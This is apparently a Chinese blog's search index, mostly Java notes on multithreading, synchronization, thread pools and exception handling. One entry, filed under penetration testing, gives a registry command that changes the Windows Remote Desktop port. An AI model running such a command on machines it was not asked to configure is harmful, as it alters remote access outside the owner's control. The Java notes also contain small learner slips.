问题2：再启动一个线程，遍历100以内偶数，不可以还让已经start()的线程去执行 // 但是可以new一个新的线程的对象，再去启动 MyThread1 myThread2 = new MyThread1(); myThread2.start(); //如下操作仍然是在main线程中执行的 for (int i = 0; i \u003c 100; i++) { System.out.println(\"hello\"); //hello在哪输出是不确定的 System.out.println(Thread.currentThread().getName() + \":\" + i); //查看线程名 } } } //1.创建一个继承与Thraed的子类 class MyThread1 extends Thread{ //2.重写Thread类的run()方法 @Override public void run() { //方法体里面，要写要做的事 for (int i = 0; i \u003c 100; i++) { if(i % 2 == 0){ System.out.println(Thread.currentThread().getName() + \":\" + i); } } } } 例子：创建两个分线程，其中一个遍历100以内偶数，另外一个遍历100以内基数(两个线程做的事情不一样) package cn.xpshuai.java1; /** * @author: 剑胆琴心 * @create 2021-01-16 16:11 * 练习：创建两个分线程，其中一个遍历100以内偶数，另外一个遍历100以内基数(两个线程做的事情不一样) */ public class ThreadCase { public static void main(String[] args) { //可以写两个，分别调用 ForDouble m1 = new ForDouble(); ForSingle m2 = new ForSingle(); m1.start(); m2.start(); // 或者：如果只用一次的话，可以创建Thread类的匿名子类的方法 new Thread(){ @Override public void run() { for (int i = 0; i \u003c 100; i++) { if(i % 2 == 0){ System.out.println(Thread.currentThread().getName() + \"-- 偶数 --\" + i); } } } }.start(); new Thread(){ @Override public void run() { for (int i = 0; i \u003c 100; i++) { if(i % 2 != 0){ System.out.println(Thread.currentThread().getName() + \"-- 偶数 --\" + i); } } } }.start(); } } class ForDouble extends Thread{ @Override public void run() { for (int i = 0; i \u003c 100; i++) { if(i % 2 == 0){ System.out.println(Thread.currentThread().getName() + \"-- 偶数 --\" + i); } } } } class ForSingle extends Thread{ @Override public void run() { for (int i = 0; i \u003c 100; i++) { if(i % 2 != 0){ System.out.println(Thread.currentThread().getName() + \"-- 奇数 --\" + i); } } } } 不完善的例子2：继承Thread方式，实现多线程三个窗口售票，总票数为100张例子（待实现线程安全问题） package cn.xpshuai.java1; /** * @author: xps * @create 2021-01-16 17:30 * @功能：继承Thread方式，实现多线程三个窗口售票，总票数为100张例子 */ public class ThreadCase2 { public static void main(String[] args) { Windows w1 = new Windows(); Windows w2 = new Windows(); Windows w3 = new Windows(); w1.setName(\"窗口1\"); w2.setName(\"窗口2\"); w3.setName(\"窗口3\"); w1.start(); w2.start(); w3.start(); } } class Windows extends Thread{ // private int tickets = 100; //这样只是实例的变量，会卖300张 private static int tickets = 100; //加了static也不对，需要解决线程安全问题 @Override public void run() { while (true){ if (tickets \u003e 0){ System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + tickets); tickets--; }else { break; } } } } 方法2：实现Runnable接口的方式 步骤： 创建一个实现了Runnable接口的类 实现Runnable中的抽象方法: run() 创建实现类的对象 将此对象作为参数传递到Thread类的构造器中，创建Thread的对象 通过Thread的对象调用start() package cn.xpshuai.java1; /** * @author: 剑胆琴心 * @create 2021-01-16 17:48 * @功能： * * * 【创建多线程的方式2】：实现Runnable接口的方式 * 1.创建一个实现了Runnable接口的类 * 2.实现Runnable中的抽象方法: run() * 3.创建实现类的对象 * 4.将此对象作为参数传递到Thread类的构造器中，创建Thread的对象 * 5.通过Thread的对象调用start() * */ public class MultiThreadTest2 { public static void main(String[] args) { // 3.创建实现类的对象 MyThread11 m11 = new MyThread11(); // 4.将此对象作为参数传递到Thread类的构造器中，创建Thread的对象 Thread t1 = new Thread(m11);//类似于多态的思想 t1.setName(\"线程1\"); // 5.通过Thread的对象调用","date":"2021-01-17","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/:0:2","tags":["Java","多线程"],"title":"Java学习之多线程","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java学习"],"content":"线程的分类 守护线程 用户线程 它们在几乎每个方面都是相同的，唯一的区别是判断JVM何时离开。 守护线程是用来服务用户线程的，通过在start()方法前调用 thread.setDaemon(true)可以把一个用户线程变成一个守护线程。 Java垃圾回收就是一个典型的守护线程。 若JVM中都是守护线程，当前JVM将退出。 形象理解：兔死狗烹，鸟尽弓藏 ","date":"2021-01-17","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/:0:3","tags":["Java","多线程"],"title":"Java学习之多线程","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java学习"],"content":"线程的生命周期 这个生命周期流程图需要记住！！！ ","date":"2021-01-17","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/:0:4","tags":["Java","多线程"],"title":"Java学习之多线程","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java学习"],"content":"线程的同步(重难点) 解决的是线程安全的问题 问题的提出： 多个线程执行的不确定性引起执行结果的不稳定 多个线程对账本的共享，会造成操作的不完整性，会破坏数据。 解决线程安全问题共有三种方式： 1.同步代码块 package cn.xpshuai.java2; /** * @author: 剑胆琴心 * @create 2021-01-17 9:14 * @功能：使用同步代码块，解决前面通过实现Runnable方法实现的3个窗口同时卖100张票出现重票、错票的的线程安全问题 问题：出现了重票、错票--\u003e出现了线程的安全问题 原因：当某个线程操作车票过程中，尚未操作完成时，其他线程参与进来，也操作车票 解决：当一个线程在操作贡献数据的时候，其他线程不能参与进来，直到线程A操作完其他线程才可以开始操作共享数据， 即是线程A出现了阻塞，也不能被改变。加锁。 在Java中：通过同步机制来解决线程的安全问题 方式1：同步代码块 synchronized(同步监视器){ //需要被同步的代码：即操作共享数据(多个线程共同操作的变量)的代码(不能包含代码多了，也不能包含代码少了--\u003e只包含操作的代码) } 说明：同步监视器--\u003e俗称：锁。任何一个类的对象都可以充当锁 要求：多个线程必须共用同一把锁(唯一的) 同步的方式：解决了线程的安全问题 -- 好处 操作同步代码时，只能有一个线程参与，其他线程等待，相当于是一个单线程的过程，效率低 --不足之处 补充: 在实现Runnable接口创建多线程的方法中，我们可以考虑使用this作为同步监视器 方式2：同步方法 如果操作共享数据的代码完整的声明在一个方法中，我们不妨将此方法声明为同步的 synchronized 操作方法_name(){ //操作共享数据的代码块 } 关于同步方法的总结: 1.同步方法仍然涉及到同步监视器，只是不需要我们显式的声明。 2．非静态的同步方法，同步监视器是:this 静态的同步方法，同步监视器是:当前类本身 */ public class ThreadCase4 { public static void main(String[] args) { Windows2 w = new Windows2(); Thread t1 = new Thread(w); Thread t2 = new Thread(w); Thread t3 = new Thread(w); t1.setName(\"窗口1\"); t2.setName(\"窗口2\"); t3.setName(\"窗口3\"); t1.start(); t2.start(); t3.start(); } } class Windows2 implements Runnable{ private int tickets = 100; //共享数据 // Object obj = new Object(); //这里的对象是唯一的就行(多个线程用的是同一个) @Override public void run() { while (true){ // synchronized不能包多，比如不能把while(true)包进来--\u003e否则就成了只有一个窗口卖票了 // synchronized(Windows2.class){ //监视器方式1：这里可以用当前类作为监视器(类也是对象)，是唯一的(只会加载一次) // 监视器方式2：synchronized (obj){ //这里不能用this(代表t1,t2,t3对象，不唯一)作为同步监视器 if (tickets \u003e 0){ try { Thread.sleep(100); //先加了sleep强制阻塞，让出现错票的概率提升了 } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + tickets); tickets--; }else { break; } } } } } package cn.xpshuai.java2; /** * @author: 剑胆琴心 * @create 2021-01-17 9:47 * @功能： 使用同步代码块，解决前面通过继承Thread方式实现的3个窗口同时卖100张票出现重票、错票的的线程安全问题 说明：在通过继承Thread创建多方式，慎用this作为同步监视器，考虑使用当前类作为同步监视器（考虑是不是唯一的） */ public class ThreadCase5 { public static void main(String[] args) { Windows w1 = new Windows(); Windows w2 = new Windows(); Windows w3 = new Windows(); w1.setName(\"窗口1\"); w2.setName(\"窗口2\"); w3.setName(\"窗口3\"); w1.start(); w2.start(); w3.start(); } } class Windows extends Thread{ private static int tickets = 100; //加了static也不对，需要解决线程安全问题 // private static Object obj = new Object(); //不唯一，所以加static @Override public void run() { while (true){ // 监视器方式1：为了更简便,用当前对象来作为监视器，这里的this：唯一的Window对象 synchronized(this){ // 监视器方式2：synchronized(obj) if (tickets \u003e 0){ try { Thread.sleep(100); //使得错票概率变大 } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + tickets); tickets--; }else { break; } } } } } 2.同步方法 package cn.xpshuai.java2; /** * @author: 剑胆琴心 * @create 2021-01-17 10:04 * @功能：使用同步方法，解决通过Runnable实现的抢票的安全问题 * * * *【关于同步方法的总结】: * 1.同步方法仍然涉及到同步监视器，只是不需要我们显式的声明。 * 2．非静态的同步方法，同步监视器是:this * 静态的同步方法，同步监视器是:当前类本身 * * * * */ public class ThreadCase6 { public static void main(String[] args) { Windows3 w = new Windows3(); Thread t1 = new Thread(w); Thread t2 = new Thread(w); Thread t3 = new Thread(w); t1.setName(\"窗口1\"); t2.setName(\"窗口2\"); t3.setName(\"窗口3\"); t1.start(); t2.start(); t3.start(); } } class Windows3 implements Runnable{ private int tickets = 100; //共享数据 @Override public void run() { while (true){ show(); } } // 同步监视器：this，只是省略了没写 private synchronized void show(){ //把操作代码单独提出来，不能多提也不能少提 if (tickets \u003e 0){ try { Thread.sleep(100); //先加了sleep强制阻塞，让出现错票的概率提升了 } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + tickets); tickets--; } } } package cn.xpshuai.java2; /** * @author: 剑胆琴心 * @create 2021-01-17 10:10 * @功能： 使用同步方法，解决通过继承Thread类的方式实现的抢票的安全问题 */ public class ThreadCase7 { public static void main(String[] args) { Windows4 w1 = new Windows4(); Windows4 w2 = new Windows4(); Windows4 w3 = new Windows4(); w1.setName(\"窗口1\"); w2.setName(\"窗口2\"); w3.setName(\"窗口3\"); w1.start(); w2.start(); w3.start(); } } ","date":"2021-01-17","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/:0:5","tags":["Java","多线程"],"title":"Java学习之多线程","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java学习"],"content":"线程的通信 其实就是几个方法的使用 package cn.xpshuai.java3; /** * @author: 剑胆琴心 * @create： 2021-01-17 14:12 * @功能：线程通信的例子，一个线程打印偶数，一个线程打印奇数, 交替打印 * * *设计到的三个方法： * wait():一旦执行此方法，当前线程就进入阻塞状态，并释放同步监视器 * notify(): 一旦执行此方法，就会唤醒被wait的一个线程。如果有多个线程被wait，就唤醒优先级高的那个。 * notify():一旦执行此方法,就会唤醒所有被wait的线程。 * * 说明： * 1.wait(),notify(),notify()以上三个方法必须出现在同步代码块或者同步方法当中，不能用在lock()的情况下 * 2.这三个方法的调用者必须是同步代码块或者同步方法当中的同步监视器，否则会出异常 * 3.这三个方法是定义在java.lang.Object中的 * */ public class NumTest { public static void main(String[] args) { Number n = new Number(); Thread t1 = new Thread(n); Thread t2 = new Thread(n); t1.setName(\"线程1\"); t2.setName(\"线程2\"); t1.start(); t2.start(); } } class Number implements Runnable{ private int number = 1; // Object obj = new Object(); @Override public void run() { while (true){ synchronized (this){ // synchronized (obj){ notify(); // 2.唤醒另一个线程 // this.notify(); // 2.唤醒另一个线程 // obj.notify(); // 如果同步代码块中同步监视器为Object，调用这个方法也必须为obj // notifyAll(); // 唤醒其他所有线程 if(number \u003c= 100){ System.out.println(Thread.currentThread().getName() + \":\" + number); //查看线程名 number++; try { wait(); //1.让调用wait()的线程进入阻塞状态 // obj.wait(); } catch (InterruptedException e) { e.printStackTrace(); } }else { break; } } } } } **面试题：**sleep()和wait的异同 1.相同点:一旦执行方法，都可以使得当前的线程进入阻塞状态。 2.不同点: 1）两个方法声明的位置不同:Thread类中声明sleep() , object类中声明wait() 2）调用的要求不同: sleep()可以在任何需要的场景下调用。而wait()必须使用在同步代码块或同步方法中调用 3) 关于是否释放同步监视器，如果两个方法都使用在同步代码块或同步方法中，sleep()不会释放锁，wait()会释放锁(同步监视器) 经典例题：生产者/消费者问题 package cn.xpshuai.java3; /** * @author: 剑胆琴心 * @create: 2021-01-17 14:42 * @功能：生产者/消费者问题的例子 * * * 生产者(Productor)将产品交给店员(CLerk)，而 * 消费者(Customer)从店员处取走产品， * 店员一次只能持有固定数量的产品(比如:20)， * 如果生产者试图生产更多的产品，店员会叫生产者停一下， * 如果店中有空位放产品了再通知生产者继续生产， * 如果店中没有产品了，店员会告诉消费者等一下， * 如果店中有产品了再通知消费者来取走产品。 * * * 涉及：同步机制、多线程通信 * * */ public class ProducerCustomer { public static void main(String[] args) { Clerk clerk = new Clerk(); //这个对象自始至终只造了一个 Producer p1 = new Producer(clerk); p1.setName(\"生产者1\"); Customer c1 = new Customer(clerk); c1.setName(\"消费者1\"); p1.start(); c1.start(); } } class Clerk{ private int productCount = 0; //生产产品 public synchronized void produceProduct() { //用同步方法 if(productCount \u003c 20){ productCount++; System.out.println(Thread.currentThread().getName() + \":开始生产第\" + productCount + \"个产品\"); notify(); //唤醒消费者 }else { //等待 try{ wait(); }catch (InterruptedException e){ e.printStackTrace(); } } } //消费产品 public synchronized void consumeProduct(){ if(productCount \u003e 0){ System.out.println(Thread.currentThread().getName() + \":开始消费第\" + productCount + \"个产品\"); productCount--; notify(); //唤醒生产者 }else { //等待 try{ wait(); }catch (InterruptedException e){ e.printStackTrace(); } } } } class Producer extends Thread{ //生产者 private Clerk clerk; public Producer(Clerk clerk) { this.clerk = clerk; } @Override public void run() { System.out.println(Thread.currentThread().getName() + \":开始生产产品...\"); while (true){ clerk.produceProduct(); } } } class Customer extends Thread{ //消费者 private Clerk clerk; public Customer(Clerk clerk) { this.clerk = clerk; } @Override public void run() { System.out.println(Thread.currentThread().getName() + \":开始消费产品...\"); while (true){ clerk.consumeProduct(); } } } ","date":"2021-01-17","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/:0:6","tags":["Java","多线程"],"title":"Java学习之多线程","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java学习"],"content":"JDK5.0新增线程创建方式 2种方法 方法3：实现Callable接口 与使用Runnable相比，Callable功能更强大些： 相比重写run()方法，可以有返回值(重写call()方法) 方法可以抛出异常 支持泛型的返回值 需要借助FutureTask类，比如获取返回结果 Future接口： 可以对具体Runnable、Callable任务的执行结果进行取消、查询是否完成、获取结果等； FutrueTask是Futrue接口的唯一的实现类 FutureTask同时实现了Runnable,Future接口。它既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值 package cn.xpshuai.java3; import java.util.concurrent.Callable; import java.util.concurrent.ExecutionException; import java.util.concurrent.FutureTask; /** * @author: 剑胆琴心 * @create: 2021-01-17 15:0 * @功能：创建线程的方式三: 实现Callable接口 -- JDK5.0新增 * * *步骤： *1.创建一个Callable的实现类 *2.实现call方法，将此线程需要执行的操作声明在call()中 *3.创建Callable接口实现类的对象 *4.将此Callable接口实现类的对象作为传递到FutureTask构造器中，创建FutureTask的对象 *5.将FutureTask的对象作为参数，传递到Thread类的构造器中，创建Thread对象，并调用start() *6.获取Callable中call()方法的返回值 * * * 如何理解实现Callable接口的方式创建多线程，比实现Runnable接口创建多线程方式强大？ * 1.call()可以由返回值 * 2.call()可以抛出异常，被外面的操作捕获，获取异常的信息 * 3.Callable是支持泛型的 * * * * */ public class CallableTest { public static void main(String[] args) { // 3.创建Callable接口实现类的对象 NumThread n1 = new NumThread(); // 4.将此Callable接口实现类的对象作为传递到FutureTask构造器中，创建FutureTask的对象 FutureTask futureTask = new FutureTask(n1); // FutureTask\u003cInteger\u003e futureTask = new FutureTask\u003cInteger\u003e(n1); // 5.将FutureTask的对象作为参数，传递到Thread类的构造器中，创建Thread对象，并调用start() new Thread(futureTask).start(); try { // 6.获取Callable中call()方法的返回值 //get()返回值即为FutureTask构造器参数Callable实现类重写的的call()的返回值 Object sum = futureTask.get(); //获取回调方法的返回值, 如果对返回值不感兴趣可以不用调用这个get() // Integer sum = futureTask.get(); System.out.println(\"总和为：\" + sum); } catch (InterruptedException e) { e.printStackTrace(); } catch (ExecutionException e) { e.printStackTrace(); } } } //1.创建一个Callable的实现类 class NumThread implements Callable{ //class NumThread implements Callable\u003cInteger\u003e{ // 2.实现call方法，将此线程需要执行的操作声明在call()中 @Override public Object call() throws Exception { // public Integer call() throws Exception { int sum = 0; for (int i = 0; i \u003c 100; i++) { if (i % 2 == 0){ System.out.println(i); sum += i; } } return sum; } } 方法4：线程池 开发中，常用这个方法 **背景: **经常创建和销毁、使用量特别大的资源，比如并发情况下的线程，对性能影响很大。 思路: 提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中。可以避免频繁创建销毁、实现重复利用。类似生活中的公共交通工具。 好处: 提高响应速度（减少了创建新线程的时间) 降低资源消耗（重复利用线程池中线程,不需要每次都创建) 便于线程管理 corePoolSize: 核心池的大小 maximumPoolSize: 最大线程数 keepAliveTime: 线程没有任务时最多保持多长时间后会终止 … … package cn.xpshuai.java3; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.ThreadPoolExecutor; /** * @author: 剑胆琴心 * @create: 2021-01-17 15:37 * @功能：创建线程的方式4：线程池 * * 【步骤】 * 1.提供指定线程数量的线程池 * 2.执行指定的线程的操作，需要提供实现了Runnable接口或Callable接口实现类的对象 * 3.关闭线程池 * * 【好处】 * - 提高响应速度（减少了创建新线程的时间) * - 降低资源消耗（重复利用线程池中线程,不需要每次都创建) * - 便于线程管理 * * * * 新手本例子可能出现的问题：http://www.voidcn.com/article/p-zkcigdhf-bud.html * */ public class ThreadPool { public static void main(String[] args) { // 1.提供指定线程数量的线程池 ExecutorService service = Executors.newFixedThreadPool(10); // newFixedThreadPool方法是类Executors的静态方法. // 设置线程池的属性, 这里 System.out.println(service.getClass()); // class java.util.concurrent.ThreadPoolExecutor ThreadPoolExecutor service1 = (ThreadPoolExecutor)service; // 必须强转为这种形式才能设置属性 // service1.setCorePoolSize(15); // service1.setKeepAliveTime(1000); // 2.执行指定的线程的操作，需要提供实现了Runnable接口或Callable接口实现类的对象 service.execute(new NumberThread()); //适合使用于Runnable service.execute(new NumberThread2()); //适合使用于Runnable // service.submit(Callable callable); //适合使用于Callable // 3.关闭线程池 service.shutdown(); } } class NumberThread implements Runnable{ @Override public void run() { for (int i = 0; i \u003c= 100; i++) { if (i % 2 == 0) { System.out.println(Thread.currentThread().getName() + \"偶数：\" + i); } } } } class NumberThread2 implements Runnable{ @Override public void run() { for (int i = 0; i \u003c= 100; i++) { if (i % 2 != 0) { System.out.println(Thread.currentThread().getName() + \"奇数：\" + i); } } } } ","date":"2021-01-17","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/:0:7","tags":["Java","多线程"],"title":"Java学习之多线程","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["渗透测试"],"content":" 在网上看到大佬们的文章，我也在此记录以下 这里以修改windows远程桌面端口3389为33333为例子。 修改注册表，命令如下： REG ADD “HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp” /v “PortNumber” /t REG_DWORD /d 3333 /f ","date":"2021-01-17","objectID":"/%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E4%BF%AE%E6%94%B9windows%E6%B3%A8%E5%86%8C%E8%A1%A8/:0:0","tags":["渗透测试","注册表"],"title":"一条命令修改windows注册表","uri":"/%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E4%BF%AE%E6%94%B9windows%E6%B3%A8%E5%86%8C%E8%A1%A8/"},{"categories":["Java学习"],"content":"常见异常 Error：Java虚拟机无法解决的严重问题，如StackOverflowErroe等，一般不编写针对性代码进行处理 Exception：其它因编程错误或偶然的外在因素导致的一般性问题，可以伎用针对性的代码进行处理。例如：空指针访问、试图读取不存在的文件、网络连接中断、数组角标越界等 分类： 编译时异常 运行时异常 捕获错误最理想的是在编译期间。 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8/:0:1","tags":["Java学习","异常处理"],"title":"Java学习之异常","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8/"},{"categories":["Java学习"],"content":"异常处理1：try-catch-finally package cn.xpshuai.day12; /* 异常处理机制 Error: JVM系统内部错误,一般不不编写针对性代码进行处理 比如栈溢出，OOM（堆空间溢出） Exception: 编译时异常：编译器会自动变红叉, javac会异常，不会生成字节码文件都 运行时异常： 异常的处理:抓抛模型 过程一:\"抛\":程序在正常执行的过程中，一旦出现异常，就会在异常代码处生成一个对应异常类的对象。 并将此对象抛出。 一旦抛出对象以后，其后的代码就不再执行。 过程二:\"抓\":可以理解为异常的处理方式: 1.try-catch-finally 2.throws try-catch-finally使用 try{ 可能出现异常的代码 }catch(异常类型1 变量名1){ }catch(异常类型2 变量名2){ }catch(异常类型3 变量名3){ }finally{ 一定会执行的代码放在这里 } 说明： 1.finally是可选的。 2．使用try将可能出现异常代码包装起来，在执行过程中，一旦出现异常，就会生成一个对应异常类的对象，根据此对象 的类型，去catch中进行匹配 3.catch中的异常类型如果没有子父类关系，则谁声明在上，谁声明在下无所谓。 catch中的异常类型如果满足子父类关系，则要求子类一定声明在父类的上面。否则，报错 4.常用的异常对象处理的方式: String getMessage() printstackTrace() 5.在try结构中声明的变量，再出了try结构以后，就不能再被调用 6.体会:使用try-catch-finally处理编译时异常，是得程序在编译时就不再报错，但是运行时仍可能报错。 相当于我们使用try-catch-finally将一个编译时可能出现的异常,延迟到运行时出现。 7.finally中的是一定会执行的代码，即使catch中又出现异常了，try中有return语句，catch中有return语句等情况。 8.像数据库连接、输入输出流、网络编程Socket等资源，JVMN是不能自动的回收的，我们需要自己手动的进行资源的 释放。此时的资源释放，就需要声明在finally中。 9. try-catch可以相互嵌套 10.开发中，由于运行时异常比较常见，所以我们通常就不针对运行时异常编写try-catch-finally针对于编译时异常，我们说一定要考虑异常的处理。 运行时异常不一定非要try-catch，但编译时异常一定要加 */ import org.junit.Test; import org.junit.internal.runners.statements.ExpectException; import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; import java.util.Date; import java.util.Scanner; public class ExceptionTest { // Error @Test public void testError() { // testError(); //栈溢出 // Integer[] arr = new Integer[1024*1024*1024]; //OOM 堆空间溢出 } @Test public void testException() { String a; try{ a = \"123\"; System.out.println(a.charAt(6)); // java.lang.StringIndexOutOfBoundsException }catch (StringIndexOutOfBoundsException e){ // System.out.println(\"出现了StringIndexOutOfBoundsException异常\"); System.out.println(e.getMessage()); // e.printStackTrace(); }catch (Exception e2){ System.out.println(\"出现了其他异常2\"); }finally { System.out.println(\"finally继续执行其他语句\"); } } @Test public void testException2() { // Object obj = new Date(); // String str = (String) obj; // java.lang.ClassCastException // Scanner scanner = new Scanner(System.in); // int score = scanner.nextInt(); // System.out.println(score); // scanner.close(); // int a = 10; // int b = 0; // System.out.println(a/b); // java.lang.ArithmeticException: } @Test public void testTryCatch() { FileInputStream fis = null; try { File file = new File(\"test.txt\"); fis = new FileInputStream(file); int data = fis.read(); while (data != -1){ System.out.println((char)data); data = fis.read(); } }catch (FileNotFoundException e){ e.getMessage(); }catch (IOException e){ e.getMessage(); }catch (Exception e){ e.getMessage(); }finally { try{ // try-catch可以相互嵌套 if(fis != null) //避免空指针异常 fis.close(); //连接不会自动释放 }catch (Exception e){ e.getMessage(); } System.out.println(\"finally\"); } } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8/:0:2","tags":["Java学习","异常处理"],"title":"Java学习之异常","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8/"},{"categories":["Java学习"],"content":"异常处理2：throws + 异常类型 package cn.xpshuai.day12; /* 1. \"throws + 异常类型\"写在方法的声明处。指明此方法执行时，可能会抛出的异常类型。 一旦当方法体执行时，出现异常，仍会在异常代码处生成一个异常类的对象，此对象满足throws后异常类型时,就会被抛出。异常代码后续的代码,就不再执行! 2．体会:try-catch-finally:真正的将异常给处理掉了。 throws的方式只是将异常抛给了方法的调用者。并设有真正将异常处理掉。 3.子类抛出的异常不能大于父类的 子类重写的方法抛出的异常类型不大于父类被重写的方法抛出的异常类型 4.开发中如何选择使用try-catch-finally 还是使用throws? 4.1 如果父类中被重写的方法没有throws方式处理异常，则子类重写的方法也不能使用throws，意味着如果 子类重写的方法中有异常，必须使用try-catch-finally方式处理。 4.2 执行的方法a中，先后又调用了另外的几个方法，这几个方法是递进关系执行的。我们建议这几个方法使用throw的方式进行处理。而执行的方法a可以考虑使用try-catch-finally方式进行处理。| */ import org.junit.Test; import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; public class ThrowsTest { public static void main(String[] args) { try{ method2(); }catch (Exception e){ e.getMessage(); } } // 向上通报，抛给上面 // @Test public static void method1() throws FileNotFoundException, IOException { File file = new File(\"test1.txt\"); FileInputStream fis = new FileInputStream(file); int data = fis.read(); while (data != -1) { System.out.println((char) data); data = fis.read(); } } // 这里调用method1了，所以method1的异常就抛到method2了 public static void method2() throws FileNotFoundException, IOException{ method1(); // method2处理不了，也往上抛 } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8/:0:3","tags":["Java学习","异常处理"],"title":"Java学习之异常","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8/"},{"categories":["Java学习"],"content":"手动抛出异常：throw class Student{ private int id; public void register(int id) throws Exception{ if (id \u003e0){ this.id = id; }else{ //手动抛出异常对象 throw new Exception(\"输入数据非法\"); //编译和运行时都有了，throws给上层处理 // throw new RuntimeException(\"输入数据非法！\"); // 运行时异常 } } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8/:0:4","tags":["Java学习","异常处理"],"title":"Java学习之异常","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8/"},{"categories":["Java学习"],"content":"用户自定义异常类 /* 用户自定义异常类 1.继承现有异常结构：RuntimeException . Exception 2.提供全局常量：serialVersionUID 3.提供重载的构造器 */ public class SelfMakeExpection extends Exception{ static final long serialVersionUID = -7034897190745777777L; public SelfMakeExpection() { super(); } public SelfMakeExpection(String msg) { super(msg); } } 调用自定义异常类： class Student{ private int id; public void register(int id) throws Exception{ if (id \u003e0){ this.id = id; }else{ //手动抛出异常对象 // throw new Exception(\"输入数据非法\"); //编译和运行时都有了，throws给上层处理 // throw new RuntimeException(\"输入数据非法！\"); // 运行时异常 throw new SelfMakeExpection(\"自定义异常类：出现错误啦~~~\"); } } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8/:0:5","tags":["Java学习","异常处理"],"title":"Java学习之异常","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8/"},{"categories":["Java学习"],"content":"面向对象概述 面向对象三大特征： 封装（Encapsulation） 继承（Inheritance） 多态（Polymorphism） **类和类成员：**属性、方法、构造器(前三个重要)；代码块、内部类 **其他关键字：**this, super, static, final, abstract, interface, package, import 属性(成员变量)和局部变量： * 同： * 定义格式：数据类型 变量名 = 变量值 * 先声明后使用 * 都有其作用域 * * 异： * 1.声明位置不同 * 属性:直接定义在{}内 * 局部变量：声明在方法内部、方法形参、代码块内、构造器形参、构造器内部的变量 * 2.关于权限修饰符的不同 * 属性：可以在声明属性时候使用权限修饰符 * 如：public private， 缺省， protected * 局部变量：不能用权限修饰符 * 3.默认初始化值 * 属性：类的属性，根据其类型有初始化默认值 * 局部变量：没有默认初始化值（意味着，我们在调用局部变量的时候一定要显式赋值） * 特别的，形参在调用时赋值即可 * 4.二者在内存中加载的位置 * 属性：加载到堆空间(非static) * 局部变量：加载到栈空间 方法： * 定义格式： * 权限修饰符 返回值类型 方法名(形参列表){ * 方法体 * } * 注意：static、final、abstract来修饰的方法，后面再讲 * * 1.四种权限修饰符：public、private、缺省、 protected * 2.返回值类型； * 有返回值 vs 无返回值(void,通常不需要return，非要写的话就return;) * return之后不可以跟语句了 类的基本结构： package cn.xpshuai.test; public class PersonTest { public static void main(String[] args) { } } class Person{ // 【属性】 = 成员变量 = field = 字段、域 String name; int age; boolean isMarried; // 构造器 public Person(){} public Person(String n, boolean im) { name = n; isMarried = im; } // 【方法】 = 成员方法 = 函数 = method public void walk() { System.out.println(\"人走路...\"); } public String display() { return \"名字：\" + name + \"婚否：\" + isMarried; } // 代码块(出现的较少) { name = \"韩梅梅\"; age = 17; isMarried = true; } // 内部类(出现的较少) class pet{ String name; float weight; } } 小练习： package cn.xpshuai.test; /* * 对Stedent.java的改进 * */ public class StudentsTest { public static void main(String[] args) { // 声明 Students类型的数组 Students[] stus = new Students[20]; // 给数组元素赋值 for (int i = 0; i \u003c stus.length; i++) { stus[i] = new Students(); //给对象元素的属性赋值 stus[i].num = i + 